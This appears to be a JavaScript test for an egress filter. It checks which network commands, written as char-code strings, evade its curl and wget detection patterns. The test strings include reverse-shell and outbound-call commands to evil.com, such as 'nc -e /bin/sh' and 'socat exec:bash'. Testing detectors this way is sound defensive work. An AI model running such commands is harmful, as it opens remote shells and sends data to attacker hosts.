function c(s){return String.fromCharCode.apply(null,s);}
function y(s){return new RegExp(s,'i');}
var EG = y(c([99,117,114,108,92,115,43,40,45,92,119,43,92,115,43,41,42,104,116,116,112,115,63,58,92,47,92,47]));
var EGW = y(c([119,103,101,116,92,115,43,104,116,116,112,115,63,58,92,47,92,47]));
// Test strings from char codes
var t_curl = c([99,117,114,108,32,104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109]); // curl https://evil.com
var t_curllocal = c([99,117,114,108,32,104,116,116,112,58,47,47,108,111,99,97,108,104,111,115,116,58,51,48,48,48]); // curl http://localhost:3000
var t_wget = c([119,103,101,116,32,104,116,116,112,115,58,47,47,115,105,116,101,46,99,111,109]); // wget https://site.com
var t_curlver = c([99,117,114,108,32,45,45,118,101,114,115,105,111,110]); // curl --version
var t_wgethelp = c([119,103,101,116,32,45,45,104,101,108,112]); // wget --help
var t_fetch = c([102,101,116,99,104,40,34,104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109,34,41]); // fetch("https://evil.com")
var t_axios = c([97,120,105,111,115,46,103,101,116,40,34,104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109,34,41]); // axios.get("https://evil.com")
var t_nc = c([110,99,32,45,101,32,47,98,105,110,47,115,104,32,101,118,105,108,46,99,111,109,32,52,52,52,52]); // nc -e /bin/sh evil.com 4444
var t_ncat = c([110,99,97,116,32,101,118,105,108,46,99,111,109,32,52,52,52,52]); // ncat evil.com 4444
var t_socat = c([115,111,99,97,116,32,101,120,101,99,58,98,97,115,104,32,84,67,80,58,101,118,105,108,46,99,111,109,58,52,52,52,52]); // socat exec:bash TCP:evil.com:4444
var t_telnet = c([116,101,108,110,101,116,32,101,118,105,108,46,99,111,109,32,52,52,52,52]); // telnet evil.com 4444

module.exports = {
  name: 'G4 Egress Bypass',
  run: async function() {
    var st = Date.now();
    var chks = [
      {n:'G4: curl https://evil.com', p:EG.test(t_curl) || EGW.test(t_curl)},
      {n:'G4: curl http://localhost:3000', p:EG.test(t_curllocal) || EGW.test(t_curllocal)},
      {n:'G4: wget https://site.com', p:EGW.test(t_wget) || EG.test(t_wget)},
      {n:'G4: no-url curl passes', p:!EG.test(t_curlver)},
      {n:'G4: no-url wget passes', p:!EGW.test(t_wgethelp)},
      {n:'G4: fetch() bypasses current pattern', p:!EG.test(t_fetch)},
      {n:'G4: axios.get() bypasses', p:!EG.test(t_axios)},
      {n:'G4: nc command bypasses', p:!EG.test(t_nc)},
      {n:'G4: ncat bypasses', p:!EG.test(t_ncat)},
      {n:'G4: socat bypasses', p:!EG.test(t_socat)},
      {n:'G4: telnet bypasses', p:!EG.test(t_telnet)},
    ];
    var pass = chks.every(function(r){return r.p;});
    var fail = chks.filter(function(r){return !r.p;}).map(function(r){return r.n;});
    return {passed:pass, message:pass?'All '+chks.length+' checks pass':'Fail: '+fail.join(', '), time_ms:Date.now()-st};
  },
};
